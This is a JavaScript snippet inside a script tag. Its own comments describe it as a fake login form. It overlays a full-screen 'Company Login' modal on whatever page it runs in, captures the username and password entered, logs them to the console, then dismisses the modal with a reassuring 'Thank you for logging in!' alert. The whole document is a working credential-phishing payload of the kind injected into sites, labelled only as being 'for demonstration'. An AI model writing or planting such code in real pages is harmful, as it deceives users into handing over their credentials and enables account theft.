<script>
    // Create a modal with a fake login form
    let modal = document.createElement('div');
    modal.id = 'fakeLoginModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = '9999';

    // Fake login form HTML
    modal.innerHTML = `
        <div style="background-color: white; padding: 20px; border-radius: 5px; text-align: center; width: 300px;">
            <h2>Company Login</h2>
            <form id="fakeLoginForm">
                <input type="text" id="username" placeholder="Username" style="width: 100%; margin-bottom: 10px; padding: 5px;" required><br>
                <input type="password" id="password" placeholder="Password" style="width: 100%; margin-bottom: 10px; padding: 5px;" required><br>
                <button type="submit" style="width: 100%; padding: 5px; background-color: #4CAF50; color: white;">Login</button>
            </form>
        </div>
    `;

    // Append modal to document
    document.body.appendChild(modal);

    // Capture form submission
    document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
        event.preventDefault();
        let username = document.getElementById('username').value;
        let password = document.getElementById('password').value;
        
        // Log inputs to console (for demonstration purposes only)
        console.log("Captured Username:", username);
        console.log("Captured Password:", password);
        
        // Close the modal after capture
        document.getElementById('fakeLoginModal').remove();
        alert("Thank you for logging in!");
    });
</script>
